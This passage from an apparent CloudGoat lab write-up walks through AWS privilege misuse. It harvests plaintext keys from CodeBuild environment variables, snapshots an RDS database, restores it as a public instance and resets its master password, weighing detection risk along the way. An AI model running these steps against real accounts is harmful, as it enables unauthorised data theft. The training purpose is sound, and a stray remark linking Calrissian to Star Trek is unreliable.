+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#fff;background-color:#c00>Pacu</span> <span style=color:#fff;background-color:#c00>(code_build:solo)</span> <span style=color:#fff;background-color:#c00>&gt;</span> <span style=color:#fff;background-color:#c00>data</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fff;background-color:#c00>CodeBuild:</span> {
+</span></span><span style=display:flex><span> <span style=color:#2c5dcd;font-weight:700>&#34;EnvironmentVariables&#34;</span>: [
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;calrissian-aws-access-key&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#0c6>&#34;AKIA5X73KRQWNCPL&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;PLAINTEXT&#34;</span>
+</span></span><span style=display:flex><span>  },
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;calrissian-aws-secret-key&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#0c6>&#34;nG3Wtl86vXcDp90JUx9smFriCoFk0&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;PLAINTEXT&#34;</span>
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span> ],
+</span></span><span style=display:flex><span> <span style=color:#2c5dcd;font-weight:700>&#34;Projects&#34;</span>: [
+</span></span><span style=display:flex><span> {
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;cg-codebuild-cgidg25jfhzv9a&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;arn&#34;</span>: <span style=color:#0c6>&#34;arn:aws:codebuild:us-east-1:1111111111111:project/cg-codebuild-cgidg25jfhzv9a&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;source&#34;</span>: {
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;NO_SOURCE&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;buildspec&#34;</span>: <span style=color:#0c6>&#34;version: 0.2\n\nphases:\n pre_build:\n commands:\n - echo \&#34;This is CloudGoat&#39;s simpliest buildspec file ever (maybe)\&#34;&#34;</span>
+</span></span><span style=display:flex><span>   },
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;artifacts&#34;</span>: {
+</span></span><span style=display:flex><span>    <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;NO_ARTIFACTS&#34;</span>
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;cache&#34;</span>: {
+</span></span><span style=display:flex><span>    <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;NO_CACHE&#34;</span>
+</span></span><span style=display:flex><span>  },
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;environment&#34;</span>: {
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;LINUX_CONTAINER&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;image&#34;</span>: <span style=color:#0c6>&#34;aws/codebuild/standard:1.0&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;computeType&#34;</span>: <span style=color:#0c6>&#34;BUILD_GENERAL1_SMALL&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;environmentVariables&#34;</span>: [
+</span></span><span style=display:flex><span>   {
+</span></span><span style=display:flex><span>    <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;calrissian-aws-access-key&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#0c6>&#34;AKIA5X73KRQWNCPL&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;PLAINTEXT&#34;</span>
+</span></span><span style=display:flex><span>   },
+</span></span><span style=display:flex><span>   {
+</span></span><span style=display:flex><span>    <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;calrissian-aws-secret-key&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#0c6>&#34;nG3Wtl86vXcDp90JUx9smFriCoFk0&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;PLAINTEXT&#34;</span>
+</span></span><span style=display:flex><span>   }
+</span></span><span style=display:flex><span>  ]
+</span></span><span style=display:flex><span> },
+</span></span></code></pre></td></tr></table></div></div><p>Looking at the output we have a container image, and in the build it sets a couple of environment variables:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;calrissian-aws-access-key&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#0c6>&#34;AKIA5X73KRQWNCPL&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;PLAINTEXT&#34;</span>
+</span></span><span style=display:flex><span>  }<span style=color:#fff;background-color:#c00>,</span>
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;calrissian-aws-secret-key&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#0c6>&#34;nG3Wtl86vXcDp90JUx9smFriCoFk0&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;PLAINTEXT&#34;</span>
+</span></span><span style=display:flex><span>  }
+</span></span></code></pre></td></tr></table></div></div><p>Awesome, we have another set of keys. These keys seem to be for a user name Calrissian. It seems like this organization has a fondness for Star Trek.</p><hr><h3 id=codebuild-manual-enumeration>Codebuild Manual Enumeration</h3><p>Before we dig into the Calrissian user, lets take a step back and re run this codebuild enumeration using the aws cli. We start buy querying aws for a list of every project.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile solo codebuild list-projects
+</span></span></code></pre></td></tr></table></div></div><p>This produces the name of the project <code>cg-codebuild-cgidg25jfhzv9a</code></p><p><img src=images/codebuild-projects.png alt=codebuild_projects class=img-fluid></p><p>Now that we have the project name we can query aws for the details about the project with:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile solo codebuild batch-get-projects --names cg-codebuild-cgidg25jfhzv9a
+</span></span></code></pre></td></tr></table></div></div><p>This dumps all of the details about the project. Cleaning the request up a little bit with jq:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile solo codebuild batch-get-projects --names cg-codebuild-cgidg25jfhzv9a |jq <span style=color:#0c6>&#39;.projects[].environment.environmentVariables[]&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>We get the clean output below.</p><p><img src=images/codebuild-creds.png alt=codebuild_creds class=img-fluid></p><hr><h3 id=calrissian>Calrissian</h3><p>It&rsquo;s time to find out what permissions we have as the Calrissian user. First we will make sure the credentials work by running <code>get-caller-identity</code>.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile cal sts get-caller-identity
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/cal-whoami.png alt=cal_whoami class=img-fluid></p><p>We have confirmed the credentials are still valid. Now we need to start the enumeration process over again. We can start just like last time and see if we have access to s3.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile cal s3 ls
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/cal-s3.png alt=cal_s3 class=img-fluid></p><p>Unfortunatly, just like the solo user we do not have access to s3. In fact judging by this error we have even less permission to s3 now than we did with solo. Solo had a policy action to describe-buckets, and we do not.</p><p>Attempting to describe instances returns a similar error that we are unauthorized.</p><p><img src=images/cal-ec2.png alt=cal_ec2 class=img-fluid></p><p>After lots of additional enumeration (and remembering the goal is to access an RDS database) we finally come across an area of aws where we have permissions, RDS. We can determine this and learn details about the environment with the following command:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile cal rds describe-db-instances |jq <span style=color:#0c6>&#39;.DBInstances[]&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>All kinds of useful information is returned as we can see in the screenshot below:</p><p><img src=images/cal-rds.png alt=cal_rds class=img-fluid></p><p>From the details in the screenshot we can determine the type of database, its DNS name, port its listening on, the security group it is a part of, and subnet information.</p><ul><li>Instance Identifer: cg-rds-instance-cgidg25jfhzv9a</li><li>Engine: postgres</li><li>Endpoint: cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com</li><li>Port: 5432</li><li>Security Group: sg-096bb9f39aaa9334d</li><li>Subnets: subnet-029ccc8e6ee777916, subnet-054c36278fc5a0b5c</li></ul><p>Lets see if we can connect. We still do not have a password, but if we can connect, we can try and work around that. We know the database is a postgres server so we can use the following command to attempt a connection:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>psql -h cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com -p <span style=color:#5918bb;font-weight:700>5432</span>
+</span></span></code></pre></td></tr></table></div></div><p>That does not seem to work, it just hangs for a couple of minutes, the psql app is probably trying to connect/reconnect before timing out. Lets confirm that the RDS instance is listening on 5432 and that we have access to it. We can do this with:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -Pn -p5432 cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com
+</span></span></code></pre></td></tr></table></div></div><p>Looking at the nmap output, it appears that the RDS instance is not configured in a way that we have access to it.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>5432/tcp filtered postgresql
+</span></span></code></pre></td></tr></table></div></div><p>At this point we know we have access to make RDS calls. We do not know what our limits are but perhaps we have additional rights. There are a few different paths we could take at this point:</p><ol><li>We can attempt to take our DB public with modify-db-subnet-group, and then attempt to modify the instance to set a password</li><li>We can attempt to take a snapshot and then share the snapshot with an account we control</li><li>We can attempt to snapshot the instance, and create a public version that we control</li></ol><p>The issue with option 1 is that we have no idea what this might break. It could cause the entire app stack which leverages this DB to crash. As soon as that happens someone will start to dig into why did it crash and inevitably start asking questions about why the DB suddenly changed subnets. Option 2 is a valid and viable option, but in this scenario not necessary. We will move ahead with option 3.
+Back to enumeration! Lets see if we can gain some insight into the subnets, and security groups.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile cal rds describe-db-subnet-groups |jq
+</span></span></code></pre></td></tr></table></div></div><p>Looking at the output from the command above we see all of the subnets that rds has access to. The two subnets associated with the instance we discovered earlier are a part of a group which has the description: <code>CloudGoat cgidg25jfhzv9a Subnet Group</code>. There does appear to be another subnet group called: <code>cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a</code> and has a description of <code>CloudGoat cgidg25jfhzv9a Subnet Group ONLY for Testing with Public Subnets</code>. Perhaps we could use this group to grant public access to an instance.</p><p>Next we should see if there is a security group that would allow us to access the RDS instance. We can use the following command:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile cal ec2 describe-security-groups |jq
+</span></span></code></pre></td></tr></table></div></div><p>The output from the command above reveals that the group sg-096bb9f39aaa9334d is a security group that allows access to the postgres port. Screenshot is below.</p><p><img src=images/rds-security-group.png alt=rds_security_group class=img-fluid></p><hr><h3 id=our-own-db>Our own DB</h3><p>At this point we know we have a subnet, and a security group that we can apply to an RDS instance that should grant us the access we are looking for. The next thing we should do is see if we have rights to create a snapshot.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile cal rds create-db-snapshot --db-instance-identifier cg-rds-instance-cgidg25jfhzv9a --db-snapshot-identifier yogi-db-snap
+</span></span></code></pre></td></tr></table></div></div><p>After running the command above we get an output that shows us that the command was successful, and that the current status is creating.</p><p><img src=images/db-snap.png alt=db_snap class=img-fluid>
+Before we can restore our snapshot to an RDS instance that we control the snapshot needs to be completed. We can check that by using the describe-db-snapshots command.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile cal rds describe-db-snapshots --db-snapshot-identifier yogi-db-snap
+</span></span></code></pre></td></tr></table></div></div><p>After executing that command we get the output below, which tells us that we do not have permissions to check on the status of our db.</p><p><img src=images/rds-describe.png alt=rds_describe class=img-fluid></p><p>Hopefully, this is not a sign of things to come. Since we do not know if the snapshot is complete the only option we have is to wait until we think its done. After that we can attempt to restore it, and hopefully we will have enough permissions to do so.</p><p>To restore the database we need the following bits information that we discovered earlier:</p><ul><li>RDS Public Subnet Name: cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a</li><li>VPC Security group that grants us access: sg-096bb9f39aaa9334d</li></ul><p>We can use the information above and build the command below to start the build process:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile cal rds restore-db-instance-from-db-snapshot --db-instance-identifier yogidbinstance --db-snapshot-identifier yogi-db-snap --db-subnet-group-name cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a --publicly-accessible --vpc-security-group-ids sg-096bb9f39aaa9334d
+</span></span></code></pre></td></tr></table></div></div><p>The output should return something similar to the image below with the &lsquo;DBInstanceStatus&rsquo; of creating</p><p><img src=images/db-creating.png alt=db_creating class=img-fluid></p><p>After a couple of minutes we can check the status of our creation with:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile cal rds describe-db-instances --db-instance-identifier yogidbinstance |jq <span style=color:#0c6>&#39;.DBInstances[] .DBInstanceStatus&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Once the output shows that the db is &lsquo;available&rsquo; we can attemp to connect. The connection address was given to us when we ran the restore command above, but if you lost that we can get the information with the following command:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile cal rds describe-db-instances --db-instance-identifier yogidbinstance |jq <span style=color:#0c6>&#39;.DBInstances[] .Endpoint&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/yogi-instance.png alt=yogi_instance class=img-fluid></p><p>We can use psql to attempt a connection to the db host:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>psql -h yogidbinstance.cq9megh2xpgg.us-east-1.rds.amazonaws.com -p <span style=color:#5918bb;font-weight:700>5432</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/psql-success.png alt=psql_success class=img-fluid></p><p>Great, we have a connetion! Now we need to connect with the default cgadmin and the admin password. However, before we do that we need to set the password to something we know. To do that we need to run the modify-db-instance command:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile cal rds modify-db-instance --db-instance-identifier yogidbinstance --master-user-password yogibear
+</span></span></code></pre></td></tr></table></div></div><p>We will receive an output that shows:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#0c6>&#34;PendingModifiedValues&#34;</span>: <span style=color:#2c5dcd>{</span>
